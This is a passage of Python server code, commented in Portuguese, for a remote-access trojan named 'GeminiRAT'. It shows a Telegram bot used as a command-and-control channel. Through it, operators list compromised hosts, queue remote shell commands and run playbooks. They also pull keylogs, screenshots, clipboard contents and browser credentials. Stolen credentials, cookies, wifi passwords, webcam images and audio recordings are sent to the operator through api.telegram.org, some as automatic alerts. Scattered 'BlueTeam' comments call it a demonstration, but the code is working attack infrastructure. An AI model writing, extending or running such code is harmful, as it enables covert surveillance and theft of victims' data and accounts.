                task_id = add_task_to_db(agent_id, 'screenshot', None, issued_by='scheduler')
                logger.info('[SCHED] Screenshot enfileirado para %s (task %s)', agent_id, task_id)
                # Agenda proximo disparo
                sched['next_at'] = now + sched['interval']
            for aid in to_remove:
                _screenshot_schedules.pop(aid, None)
                logger.info('[SCHED] Agente %s offline — agendamento cancelado.', aid)
        except Exception as e:
            logger.error('[SCHED] Erro no screenshot sweeper: %s', e)


# BlueTeam: demonstra T1102 (Web Service as C2) — tráfego vai para
# api.telegram.org, domínio legítimo raramente bloqueado por firewalls.

# ---------------------------------------------------------------------------
# ESTADO DO BOT — variáveis em memória
# ---------------------------------------------------------------------------
# task_id -> {'chat_id': str, 'command': str, 'agent_id': str}
_tg_pending_tasks: dict = {}
# chat_id -> {'id': agent_id, 'hostname': str}  — agente ativo por sessão
_tg_active_agent: dict  = {}
# task_id mais recente emitida por chat_id (para /cancel)
_tg_last_task: dict     = {}   # chat_id -> task_id
# Offset do getUpdates — evita reprocessar mensagens já tratadas
_tg_update_offset: list = [0]

# Tipos de resultado que disparam alerta proativo (configurável via /alerts)
_TG_DEFAULT_ALERT_TYPES = {
    'credentials', 'cookies', 'wifi_passwords', 'screenshot_result',
    'clipboard_monitor_result', 'session_export_result', 'audio_capture_result',
}


# ---------------------------------------------------------------------------
# HELPERS DE API
# ---------------------------------------------------------------------------

def _tg_api(token: str, method: str, **kwargs) -> dict:
    """
    Chama um método da Telegram Bot API.
    Usa tpool.execute para rodar o requests.post em uma thread real,
    evitando que I/O bloqueante (SSL + TCP para api.telegram.org)
    congele o event loop do eventlet e cause desconexão dos WebSockets.
    """
    def _do() -> dict:
        try:
            r = requests.post(
                f'https://api.telegram.org/bot{token}/{method}',
                timeout=8, **kwargs
            )
            return r.json() if r.ok else {}
        except Exception as e:
            logger.warning('[TG-BOT] API error (%s): %s', method, e)
            return {}
    try:
        return _tpool.execute(_do)
    except Exception as e:
        logger.warning('[TG-BOT] tpool error (%s): %s', method, e)
        return {}


def _tg_send(token: str, chat_id: str, text: str,
             parse_mode: str = 'HTML', reply_markup: dict | None = None) -> None:
    """Envia mensagem de texto. Trunca em 4000 chars se necessário."""
    MAX = 4000
    if len(text) > MAX:
        text = text[:MAX] + '\n\n<i>[truncado]</i>'
    payload = {'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}
    if reply_markup:
        payload['reply_markup'] = reply_markup
    _tg_api(token, 'sendMessage', json=payload)


def _tg_send_photo(token: str, chat_id: str, image_bytes: bytes, caption: str = '') -> None:
    """Envia imagem PNG ao operador."""
    try:
        _tg_api(token, 'sendPhoto',
                data={'chat_id': chat_id, 'caption': caption},
                files={'photo': ('screenshot.png', image_bytes, 'image/png')})
    except Exception as e:
        logger.warning('[TG-BOT] Erro ao enviar foto: %s', e)


def _tg_send_document(token: str, chat_id: str, content: str,
                      filename: str, caption: str = '') -> None:
    """Envia texto longo como arquivo .txt ao operador."""
    try:
        _tg_api(token, 'sendDocument',
                data={'chat_id': chat_id, 'caption': caption},
                files={'document': (filename, content.encode('utf-8'), 'text/plain')})
    except Exception as e:
        logger.warning('[TG-BOT] Erro ao enviar documento: %s', e)


def _tg_answer_callback(token: str, callback_query_id: str, text: str = '') -> None:
    """Responde ao callback de botão inline (obrigatório para remover o spinner)."""
    _tg_api(token, 'answerCallbackQuery',
            json={'callback_query_id': callback_query_id, 'text': text, 'show_alert': False})


# ---------------------------------------------------------------------------
# HELPERS DE LÓGICA
# ---------------------------------------------------------------------------

def _tg_find_agent(prefix: str) -> dict | None:
    """Encontra agente pelo prefixo de UUID ou hostname (case-insensitive)."""
    agents = get_agents_with_status()
    prefix_lower = prefix.lower()
    for agent_id, agent in agents.items():
        if agent_id.startswith(prefix_lower):
            return {'id': agent_id, **agent}
        if (agent.get('hostname') or '').lower() == prefix_lower:
            return {'id': agent_id, **agent}
    return None


def _tg_resolve_agent(chat_id: str, arg: str) -> dict | None:
    """
    Resolve agente: usa `arg` se fornecido, senão o agente ativo da sessão.
    Retorna o dict do agente ou None.
    """
    if arg:
        return _tg_find_agent(arg)
    active = _tg_active_agent.get(chat_id)
    if active:
        # Atualiza o dict com status atual
        agents = get_agents_with_status()
        full = agents.get(active['id'])
        if full:
            return {'id': active['id'], **full}
    return None


def _tg_queue_task(token: str, chat_id: str, agent: dict,
                   command: str, args: str, silent: bool = False) -> str:
    """
    Enfileira uma task para o agente, registra para entrega e notifica o painel.
    Retorna o task_id gerado.
    """
    task_id = add_task_to_db(agent['id'], command, args or None, issued_by='telegram_bot')
    _tg_pending_tasks[task_id] = {
        'chat_id':  chat_id,
        'command':  command,
        'agent_id': agent['id'],
    }
    _tg_last_task[chat_id] = task_id

    conn = get_db_connection()
    tasks = [dict(r) for r in conn.execute(
        "SELECT * FROM tasks WHERE agent_id = ? ORDER BY timestamp_issued DESC",
        (agent['id'],)
    ).fetchall()]
    conn.close()
    socketio.emit('tasks_update', {'agent_id': agent['id'], 'tasks': tasks})

    if not silent:
        _tg_send(token, chat_id,
            f'✅ <b>Task enfileirada</b>\n'
            f'<b>Agente:</b> <code>{agent.get("hostname","?")}</code>\n'
            f'<b>Comando:</b> <code>{command}{" " + args if args else ""}</code>\n'
            f'<b>Task ID:</b> <code>{task_id[:8]}</code>'
        )
    return task_id


def _tg_inline_kb_enabled() -> bool:
    """Retorna True se inline keyboards estão habilitados nas configurações."""
    return _get_setting('tg_inline_kb', '1') == '1'


def _tg_proactive_enabled() -> bool:
    """Retorna True se alertas proativos estão habilitados nas configurações."""
    return _get_setting('tg_proactive_enabled', '1') == '1'


def _tg_bot_enabled() -> bool:
    """Retorna True se o Bot C2 (receber comandos) está habilitado."""
    return _get_setting('tg_bot_enabled', '1') == '1'


def _tg_agent_inline_keyboard(agents: dict) -> dict:
    """
    Monta InlineKeyboardMarkup com botões para cada agente online.
    Cada botão tem callback_data='select:<agent_id>'.
    Retorna {} se inline keyboards estão desabilitados.
    """
    if not _tg_inline_kb_enabled():
        return {}
    buttons = []
    for aid, a in agents.items():
        if a.get('status') != 'online':
            continue
        icon = '🟢'
        priv_icon = '⚡' if (a.get('privileges') or '').lower() in ('administrador', 'administrator', 'root') else ''
        label = f"{icon}{priv_icon} {a.get('hostname','?')} [{a.get('os_name','?').split()[0] if a.get('os_name') else '?'}]"
        buttons.append([{'text': label, 'callback_data': f'select:{aid}'}])
    if not buttons:
        return {}
    return {'inline_keyboard': buttons}


def _tg_active_label(chat_id: str) -> str:
    """Retorna string descritiva do agente ativo, ou mensagem de ausência."""
    active = _tg_active_agent.get(chat_id)
    if active:
        return f"<code>{active.get('hostname','?')}</code>"
    return '<i>nenhum — use /select</i>'


def _tg_get_alert_types() -> set:
    """Lê os tipos de alerta proativo configurados."""
    raw = _get_setting('tg_alert_types', '')
    if not raw:
        return set(_TG_DEFAULT_ALERT_TYPES)
    return {t.strip() for t in raw.split(',') if t.strip()}


# ---------------------------------------------------------------------------
# HANDLER PRINCIPAL DE COMANDOS
# ---------------------------------------------------------------------------

def _handle_tg_command(token: str, chat_id: str, text: str) -> None:
    """Parseia e executa um comando recebido pelo bot."""
    parts = text.strip().split(None, 2)
    # Remove @BotName se presente (grupos)
    raw_cmd = parts[0].lower().lstrip('/')
    cmd = raw_cmd.split('@')[0]
    arg1 = parts[1] if len(parts) > 1 else ''
    rest = parts[2] if len(parts) > 2 else ''

    # ------------------------------------------------------------------ /help
    if cmd == 'help':
        active_lbl = _tg_active_label(chat_id)
        _tg_send(token, chat_id,
            '🔮 <b>GeminiRAT Bot — Comandos</b>\n\n'
            '<b>Controle de agente</b>\n'
            '/select [id|hostname] — selecionar agente (ou lista com botões)\n'
            '/status — KPIs do C2\n'
            '/list — todos os agentes\n'
            '/tasks [id] — fila de tasks do agente ativo\n'
            '/cancel — cancela última task enviada pelo bot\n\n'
            '<b>Coleta</b>\n'
            '/info [id] — sysinfo\n'
            '/screenshot [id] — captura de tela\n'
            '/clipboard [id] — conteúdo da área de transferência\n'
            '/credentials [id] — credenciais de navegadores\n'
            '/keylogs [id] — últimos keylogs\n'
            '/shell [id] &lt;cmd&gt; — shell remoto\n'
            '/cmd [id] &lt;comando&gt; [args] — qualquer comando\n\n'
            '<b>Playbooks</b>\n'
            '/playbook &lt;nome&gt; — executa playbook no agente ativo\n'
            '/playbooks — lista playbooks disponíveis\n\n'
            '<b>Alertas</b>\n'
            '/alerts — configuração atual\n'
            '/alerts on &lt;tipo,...&gt; — ativa tipo(s)\n'
            '/alerts off &lt;tipo,...&gt; — desativa tipo(s)\n\n'
            f'<i>Agente ativo: {active_lbl}</i>\n'
            '<i>Comandos sem [id] usam o agente ativo.</i>'
        )
        return

    # --------------------------------------------------------------- /status
    if cmd == 'status':
        agents = get_agents_with_status()
        online  = sum(1 for a in agents.values() if a.get('status') == 'online')
        offline = len(agents) - online
        conn = get_db_connection()
        pending   = conn.execute("SELECT COUNT(*) FROM tasks WHERE status='pending'").fetchone()[0]
        in_prog   = conn.execute("SELECT COUNT(*) FROM tasks WHERE status='in_progress'").fetchone()[0]
        completed = conn.execute("SELECT COUNT(*) FROM tasks WHERE status='completed'").fetchone()[0]
        conn.close()
        active_lbl = _tg_active_label(chat_id)
        _tg_send(token, chat_id,
            f'📊 <b>Status do C2</b>\n\n'
            f'🟢 Online: <b>{online}</b>   🔴 Offline: <b>{offline}</b>\n'
            f'⏳ Pendentes: <b>{pending}</b>   🔄 Em execução: <b>{in_prog}</b>   ✅ Completas: <b>{completed}</b>\n\n'
            f'🎯 Agente ativo: {active_lbl}'
        )
        return

    # ----------------------------------------------------------------- /list
    if cmd == 'list':
        agents = get_agents_with_status()
        if not agents:
            _tg_send(token, chat_id, '⚠️ Nenhum agente registrado.')
            return
        lines = ['👾 <b>Agentes</b>\n']
        for aid, a in agents.items():
            icon = '🟢' if a.get('status') == 'online' else '🔴'
            priv_icon = '⚡' if (a.get('privileges') or '').lower() in ('administrador','administrator','root') else ''
            active_mark = ' ◀' if _tg_active_agent.get(chat_id, {}).get('id') == aid else ''
            lines.append(
                f'{icon}{priv_icon} <code>{aid[:8]}</code> — <b>{a.get("hostname","?")}</b>'
                f' ({(a.get("os_name") or "?").split()[0]})'
                f' [{a.get("privileges","?")}]{active_mark}'
            )
        # Adiciona teclado inline para seleção rápida
        kb = _tg_agent_inline_keyboard(agents)
        _tg_send(token, chat_id, '\n'.join(lines), reply_markup=kb if kb else None)
        return

    # --------------------------------------------------------------- /select
    if cmd == 'select':
        if not arg1:
            # Mostra lista com botões inline para selecionar
            agents = get_agents_with_status()
            kb = _tg_agent_inline_keyboard(agents)
            if not kb:
                _tg_send(token, chat_id, '⚠️ Nenhum agente online para selecionar.')
                return
            _tg_send(token, chat_id,
                '🎯 <b>Selecione o agente ativo:</b>', reply_markup=kb)
            return
        agent = _tg_find_agent(arg1)
        if not agent:
            _tg_send(token, chat_id, f'❌ Agente <code>{arg1}</code> não encontrado.')
            return
        _tg_active_agent[chat_id] = {'id': agent['id'], 'hostname': agent.get('hostname','?')}
        status_icon = '🟢' if agent.get('status') == 'online' else '🔴'
        _tg_send(token, chat_id,
            f'✅ Agente ativo definido:\n'
            f'{status_icon} <b>{agent.get("hostname","?")}</b> '
            f'[{agent.get("privileges","?")}] — <code>{agent["id"][:8]}</code>'
        )
        return

    # --------------------------------------------------------------- /tasks
    if cmd == 'tasks':
        agent = _tg_resolve_agent(chat_id, arg1)
        if not agent:
            _tg_send(token, chat_id,
                '⚠️ Nenhum agente selecionado. Use /select primeiro ou /tasks &lt;id&gt;.')
            return
        conn = get_db_connection()
        rows = conn.execute(
            "SELECT command, args, status, timestamp_issued, id FROM tasks "
            "WHERE agent_id = ? ORDER BY timestamp_issued DESC LIMIT 10",
            (agent['id'],)
        ).fetchall()
        conn.close()
        if not rows:
            _tg_send(token, chat_id, f'📭 Sem tasks para <b>{agent.get("hostname","?")}</b>.')
            return
        STATUS_ICON = {'pending':'⏳','in_progress':'🔄','completed':'✅','failed':'❌','cancelled':'🚫','timeout':'⏰'}
        lines = [f'📋 <b>Tasks — {agent.get("hostname","?")}</b>\n']
        for r in rows:
            icon = STATUS_ICON.get(r['status'], '❓')
            cmd_str = r['command'] + (f' {r["args"]}' if r['args'] else '')
            lines.append(f'{icon} <code>{r["id"][:8]}</code> {cmd_str}')
        _tg_send(token, chat_id, '\n'.join(lines))
        return

    # -------------------------------------------------------------- /cancel
    if cmd == 'cancel':
        task_id = _tg_last_task.get(chat_id)
        if not task_id:
            _tg_send(token, chat_id, '⚠️ Nenhuma task recente para cancelar.')
            return
        conn = get_db_connection()
        row = conn.execute(
            "SELECT status, command, agent_id FROM tasks WHERE id = ?", (task_id,)
        ).fetchone()
        if not row:
            conn.close()
            _tg_send(token, chat_id, '❌ Task não encontrada.')
            return
        if row['status'] not in ('pending', 'in_progress'):
            conn.close()
            _tg_send(token, chat_id,
                f'⚠️ Task <code>{task_id[:8]}</code> já está <b>{row["status"]}</b> — não pode ser cancelada.')
            return
        conn.execute(
            "UPDATE tasks SET status='cancelled', updated_at=? WHERE id=?",
            (datetime.now().isoformat(), task_id)
        )
        conn.commit()
        conn.close()
        socketio.emit('task_status_update', {'task_id': task_id, 'status': 'cancelled'})
        _tg_send(token, chat_id,
            f'🚫 Task <code>{task_id[:8]}</code> (<code>{row["command"]}</code>) cancelada.')
        _tg_pending_tasks.pop(task_id, None)
        _tg_last_task.pop(chat_id, None)
        return

    # ------------------------------------------------------------- /playbooks
    if cmd == 'playbooks':
        conn = get_db_connection()
        pbs = conn.execute("SELECT name, description FROM playbooks ORDER BY name").fetchall()
        conn.close()
        if not pbs:
            _tg_send(token, chat_id, '📭 Nenhum playbook cadastrado.')
            return
        lines = ['📚 <b>Playbooks disponíveis</b>\n']
        for pb in pbs:
            lines.append(f'• <b>{pb["name"]}</b> — <i>{pb["description"] or ""}</i>')
        lines.append('\n<i>Use: /playbook &lt;nome&gt;</i>')
        _tg_send(token, chat_id, '\n'.join(lines))
        return

    # -------------------------------------------------------------- /playbook
    if cmd == 'playbook':
        if not arg1:
            _tg_send(token, chat_id, '⚠️ Use: /playbook &lt;nome&gt;')
            return
        agent = _tg_resolve_agent(chat_id, '')
        if not agent:
            _tg_send(token, chat_id,
                '⚠️ Selecione um agente primeiro com /select.')
            return
        # Busca playbook por nome (parcial, case-insensitive)
        query = (arg1 + ' ' + rest).strip().lower()
        conn = get_db_connection()
        pbs = conn.execute("SELECT * FROM playbooks").fetchall()
        conn.close()
        match = None
        for pb in pbs:
            if pb['name'].lower() == query:
                match = pb
                break
        if not match:
            for pb in pbs:
                if query in pb['name'].lower():
                    match = pb
                    break
        if not match:
            _tg_send(token, chat_id,
                f'❌ Playbook <code>{arg1}</code> não encontrado. Use /playbooks para listar.')
            return
        try:
            steps = json.loads(match['steps'])
        except Exception:
            _tg_send(token, chat_id, '❌ Erro ao parsear steps do playbook.')
            return
        for step in steps:
            _tg_queue_task(token, chat_id, agent,
                           step.get('command',''), step.get('args',''), silent=True)
        _tg_send(token, chat_id,
            f'▶️ <b>Playbook iniciado</b>\n'
            f'📚 <b>{match["name"]}</b>\n'
            f'🎯 Agente: <code>{agent.get("hostname","?")}</code>\n'
            f'📋 {len(steps)} steps enfileirados'
        )
        return

    # --------------------------------------------------------------- /alerts
    if cmd == 'alerts':
        current = _tg_get_alert_types()
        if not arg1:
            types_str = ', '.join(sorted(current)) if current else '<i>nenhum</i>'
            _tg_send(token, chat_id,
                f'🔔 <b>Alertas proativos</b>\n\n'
                f'Tipos ativos: {types_str}\n\n'
                f'<i>Tipos disponíveis: credentials, cookies, wifi_passwords, '
                f'screenshot_result, clipboard_result, error</i>\n\n'
                f'/alerts on &lt;tipo,...&gt; — ativar\n'
                f'/alerts off &lt;tipo,...&gt; — desativar\n'
                f'/alerts off all — desativar todos'
            )
            return
        sub = arg1.lower()
        types_arg = (rest or '').lower().replace(',', ' ').split() or [sub]
        if sub in ('on', 'off'):
            types_arg = (rest or '').lower().replace(',', ' ').split()
            if not types_arg:
                _tg_send(token, chat_id, f'⚠️ Use: /alerts {sub} &lt;tipo,...&gt;')
                return
            if sub == 'on':
                current.update(types_arg)
            else:
                if 'all' in types_arg:
                    current.clear()
                else:
                    current -= set(types_arg)
            _set_setting('tg_alert_types', ','.join(sorted(current)))
            types_str = ', '.join(sorted(current)) if current else '<i>nenhum</i>'
            _tg_send(token, chat_id,
                f'✅ Alertas atualizados.\nAtivos: {types_str}')
        return

    # ----------------------------------------------- Comandos que precisam de agente
    AGENT_CMDS = {
        'info':        ('sysinfo', ''),
        'screenshot':  ('screenshot', ''),
        'clipboard':   ('clipboard', ''),
        'credentials': ('credentials', ''),
    }

    if cmd in AGENT_CMDS:
        agent = _tg_resolve_agent(chat_id, arg1)
        if not agent:
            _tg_send(token, chat_id,
                f'⚠️ Agente não encontrado. Use /select ou /{cmd} &lt;id|hostname&gt;')
            return
        if agent.get('status') != 'online':
            _tg_send(token, chat_id,
                f'⚠️ <b>{agent.get("hostname","?")}</b> offline — task enfileirada mesmo assim.')
        real_cmd, real_args = AGENT_CMDS[cmd]
        _tg_queue_task(token, chat_id, agent, real_cmd, real_args)
        return

    if cmd == 'keylogs':
        agent = _tg_resolve_agent(chat_id, arg1)
        if not agent:
            _tg_send(token, chat_id, '⚠️ Agente não encontrado. Use /select primeiro.')
            return
        conn = get_db_connection()
        rows = conn.execute(
            "SELECT log_data FROM keylogs WHERE agent_id = ? ORDER BY timestamp DESC LIMIT 5",
            (agent['id'],)
        ).fetchall()
        conn.close()
        if not rows:
            _tg_send(token, chat_id, '📭 Nenhum keylog capturado para este agente.')
        else:
            combined = ''.join(r['log_data'] for r in reversed(rows))
            _tg_send(token, chat_id,
                f'⌨️ <b>Keylogs — {agent.get("hostname","?")}</b>\n\n'
                f'<pre>{combined[:3500]}</pre>'
            )
        return

    if cmd == 'shell':
        agent = _tg_resolve_agent(chat_id, arg1)
        if not agent:
            _tg_send(token, chat_id, '⚠️ Agente não encontrado. Use /select primeiro.')
            return
        shell_cmd = rest if rest else arg1 if not _tg_active_agent.get(chat_id) else arg1
        # Se agente ativo: arg1 já é o início do comando shell
        if _tg_active_agent.get(chat_id):
            shell_cmd = (arg1 + ' ' + rest).strip()
        if not shell_cmd:
            _tg_send(token, chat_id, '⚠️ Use: /shell &lt;cmd&gt; (com agente ativo) ou /shell &lt;id&gt; &lt;cmd&gt;')
            return
        _tg_queue_task(token, chat_id, agent, 'shell', shell_cmd)
        return

    if cmd == 'cmd':
        agent = _tg_resolve_agent(chat_id, arg1)
        if not agent:
            _tg_send(token, chat_id, '⚠️ Agente não encontrado. Use /select primeiro.')
            return
        sub_parts = rest.split(None, 1) if rest else []
        if not sub_parts:
            _tg_send(token, chat_id, '⚠️ Use: /cmd [id] &lt;comando&gt; [args]')
            return
        _tg_queue_task(token, chat_id, agent, sub_parts[0], sub_parts[1] if len(sub_parts) > 1 else '')
        return

    _tg_send(token, chat_id, '❓ Comando desconhecido. Use /help para ver os disponíveis.')


# ---------------------------------------------------------------------------
# ENTREGA DE RESULTADOS
# ---------------------------------------------------------------------------

def _tg_deliver_result(task_id: str, data_type: str, result_data, agent_id: str) -> None:
    """
    Chamada após task concluída no post_result().
    1) Se originada pelo bot: entrega resultado ao operador que pediu.
    2) Se tipo é "interessante" e alertas estão ativos: alerta proativo.
    """
    token = _get_setting('tg_bot_token', '')
    if not token:
        return

    # Busca hostname
    try:
        conn = get_db_connection()
        row  = conn.execute("SELECT hostname FROM agents WHERE id=?", (agent_id,)).fetchone()
        conn.close()
        hostname = row['hostname'] if row else agent_id[:8]
    except Exception:
        hostname = agent_id[:8]

    def _format_and_send(dest_chat: str, command: str) -> None:
        """Envia resultado formatado (foto / documento / texto / audio) para dest_chat."""
        # Screenshot / webcam → foto
        if data_type in ('screenshot_result', 'webcam_snap_result'):
            try:
                img_bytes = base64.b64decode(result_data)
                _tg_send_photo(token, dest_chat, img_bytes,
                    caption=f'📸 {data_type.replace("_result","").replace("_"," ").title()} — {hostname}')
            except Exception as e:
                _tg_send(token, dest_chat, f'❌ Erro ao enviar imagem: {e}')
            return

        # Audio capture → documento WAV
        if data_type == 'audio_capture_result':
            try:
                obj = result_data if isinstance(result_data, dict) else json.loads(result_data)
                wav_bytes = base64.b64decode(obj.get('wav_b64', ''))
                dur  = obj.get('duration_s', '?')
                size = obj.get('size_kb', '?')
                fname   = f'audio_{hostname}_{agent_id[:6]}.wav'
                caption = f'🎙 Audio Capture — {hostname} — {dur}s / {size}KB'
                def _do_audio():
                    import requests as _req
                    r = _req.post(
                        f'https://api.telegram.org/bot{token}/sendDocument',
                        data={'chat_id': dest_chat, 'caption': caption},
                        files={'document': (fname, wav_bytes, 'audio/wav')},
                        timeout=30
                    )
                    return r.json() if r.ok else {}
                _tpool.execute(_do_audio)
            except Exception as e:
                _tg_send(token, dest_chat, f'❌ Erro ao enviar áudio: {e}')
            return

        # Serializa resultado
        if isinstance(result_data, (dict, list)):
            text_result = json.dumps(result_data, ensure_ascii=False, indent=2)
        else:
            text_result = str(result_data)

        header = f'📦 <b>Resultado — {hostname}</b>\n<code>{command}</code>\n\n'

        # Resultados longos ou sensíveis → documento
        SENSITIVE = {'credentials', 'cookies', 'wifi_passwords',
                     'session_export', 'clipboard_monitor', 'clipboard_monitor_result',
                     'session_export_result'}
        if len(text_result) > 1500 or data_type in SENSITIVE or command in SENSITIVE:
            ext  = 'json' if text_result.startswith(('{','[')) else 'txt'
            fname = f'{command}_{hostname}_{agent_id[:6]}.{ext}'
            caption = f'📄 {command} — {hostname}'
            _tg_send_document(token, dest_chat, text_result, fname, caption)
        else:
            _tg_send(token, dest_chat,
                header + f'<pre>{text_result}</pre>')

    # 1) Entrega para quem pediu (bot-originated task)
    pending = _tg_pending_tasks.pop(task_id, None)
    if pending:
        _format_and_send(pending['chat_id'], pending['command'])

    # 2) Alerta proativo (se habilitado, tipo relevante, task não-bot)
    alert_types = _tg_get_alert_types()
    if not pending and _tg_proactive_enabled() and data_type in alert_types:
        chat_id = _get_setting('tg_chat_id', '')
        if chat_id:
            # Busca o comando da task para contexto
            try:
                conn = get_db_connection()
                t_row = conn.execute(
                    "SELECT command, issued_by FROM tasks WHERE id=?", (task_id,)
                ).fetchone()
                conn.close()
                command  = t_row['command'] if t_row else data_type
                origin   = t_row['issued_by'] if t_row else 'scheduler'
            except Exception:
                command, origin = data_type, 'scheduler'

            _tg_send(token, chat_id,
                f'🚨 <b>Alerta — {data_type}</b>\n'
                f'🖥 <b>{hostname}</b> | origem: <i>{origin}</i>'
            )
            _format_and_send(chat_id, command)


# ---------------------------------------------------------------------------
# CALLBACK HANDLER (botões inline)
# ---------------------------------------------------------------------------

def _handle_tg_callback(token: str, chat_id: str, callback_id: str, data: str) -> None:
    """Trata callbacks de botões inline (ex: seleção de agente em /list ou /select)."""
    if data.startswith('select:'):
        agent_id = data[7:]
        agents   = get_agents_with_status()
        agent    = agents.get(agent_id)
        if not agent:
            _tg_answer_callback(token, callback_id, '❌ Agente não encontrado')
            return
        _tg_active_agent[chat_id] = {'id': agent_id, 'hostname': agent.get('hostname','?')}
        _tg_answer_callback(token, callback_id,
            f'✅ Ativo: {agent.get("hostname","?")}')
        status_icon = '🟢' if agent.get('status') == 'online' else '🔴'
        _tg_send(token, chat_id,
            f'🎯 Agente ativo: {status_icon} <b>{agent.get("hostname","?")}</b> '
            f'[{agent.get("privileges","?")}] — <code>{agent_id[:8]}</code>'
        )
        return
    _tg_answer_callback(token, callback_id)


# ---------------------------------------------------------------------------
# SWEEPER (polling)
# ---------------------------------------------------------------------------

def _telegram_bot_sweeper():
    """
    Loop de polling do bot Telegram.
    Roda a cada 2s, busca novas mensagens e callbacks via getUpdates.
    Só age se bot_token e chat_id estiverem configurados.
    """
    while True:
        socketio.sleep(2)
        try:
            token   = _get_setting('tg_bot_token', '')
            chat_id = _get_setting('tg_chat_id', '')
            if not token or not chat_id:
                continue

            resp = _tg_api(token, 'getUpdates', json={
                'offset':  _tg_update_offset[0],
                'timeout': 0,
                'limit':   10,
            })
            updates = resp.get('result', [])
            for update in updates:
                _tg_update_offset[0] = update['update_id'] + 1

                # --- Mensagem de texto (comandos) ---
                message = update.get('message', {})
                if message:
                    msg_chat_id = str(message.get('chat', {}).get('id', ''))
                    msg_user_id = str(message.get('from', {}).get('id', ''))
                    text        = message.get('text', '').strip()

                    if msg_chat_id != str(chat_id):
                        continue
                    if msg_user_id and msg_user_id != str(chat_id):
                        logger.warning('[TG-BOT] Mensagem bloqueada de user_id=%s.', msg_user_id)
                        continue
                    if text.startswith('/') and _tg_bot_enabled():
                        _handle_tg_command(token, chat_id, text)
                    continue

                # --- Callback de botão inline ---
                cb = update.get('callback_query', {})
                if cb:
                    cb_chat_id  = str(cb.get('message', {}).get('chat', {}).get('id', ''))
                    cb_user_id  = str(cb.get('from', {}).get('id', ''))
                    cb_id       = cb.get('id', '')
                    cb_data     = cb.get('data', '')

                    if cb_chat_id != str(chat_id):
                        _tg_answer_callback(token, cb_id)
                        continue
                    if cb_user_id and cb_user_id != str(chat_id):
                        _tg_answer_callback(token, cb_id, '⛔ Não autorizado')
                        continue
                    _handle_tg_callback(token, chat_id, cb_id, cb_data)

        except Exception as e:
            logger.error('[TG-BOT] Sweeper error: %s', e)


def _retention_sweeper():
    """
    Purge automatico de tasks/resultados antigos.
    Roda uma vez por dia. So age se retention_days > 0 na c2_settings.

    BlueTeam: politica de retencao limita exposicao de dados operacionais
    e mantem o banco em tamanho gerenciavel em operacoes longas.
    """
    while True:
        socketio.sleep(86400)  # intervalo: 24h
        try:
            days = int(_get_setting('retention_days', '0'))
            if days <= 0:
                continue
            cutoff = (datetime.now() - timedelta(days=days)).isoformat()
            conn = get_db_connection()
            result = conn.execute(
                "DELETE FROM tasks WHERE timestamp_issued < ? "
                "AND status IN ('completed', 'failed', 'timeout')",
                (cutoff,)
            )
            deleted = result.rowcount
            conn.commit()
            conn.close()
            if deleted > 0:
                logger.info("[RETENTION] %d tasks removidas (policy: >%d dias).", deleted, days)
                _write_system_log(
                    None, 'retention_purge',
                    f'Retention policy: {deleted} tasks removidas (>{days} dias)'
                )
        except Exception as e:
            logger.error("[RETENTION] Sweeper error: %s", e)


if __name__ == '__main__':
    setup_directories()
    init_db()
    # Inicia o sweeper de timeout de tasks em background (via eventlet green thread)
    socketio.start_background_task(_task_timeout_sweeper)
    logger.info("Task timeout sweeper iniciado (intervalo: 60s, timeout: %ds).", TASK_TIMEOUT_SECONDS)
    socketio.start_background_task(_agent_heartbeat_sweeper)
    logger.info("Agent heartbeat sweeper iniciado (intervalo: 60s, offline_timeout: %ds).", AGENT_OFFLINE_TIMEOUT)
    socketio.start_background_task(_retention_sweeper)
    logger.info("Retention sweeper iniciado (intervalo: 24h).")
    socketio.start_background_task(_telegram_bot_sweeper)
    logger.info("Telegram Bot C2 sweeper iniciado (polling: 2s).")
    socketio.start_background_task(_screenshot_scheduler_sweeper)
    logger.info("Screenshot scheduler sweeper iniciado (intervalo: 30s).")
    # use_reloader=False: o reloader do Werkzeug cria dois processos,
    # duplicando todos os background tasks (sweepers, bot Telegram, etc.).
    # Com eventlet/SocketIO o reloader não funciona corretamente de qualquer forma.
    debug_enabled = os.getenv('FLASK_DEBUG', '').strip().lower() in {'1', 'true', 'yes', 'on'}
    socketio.run(app, host='0.0.0.0', port=8000, debug=debug_enabled, use_reloader=False)
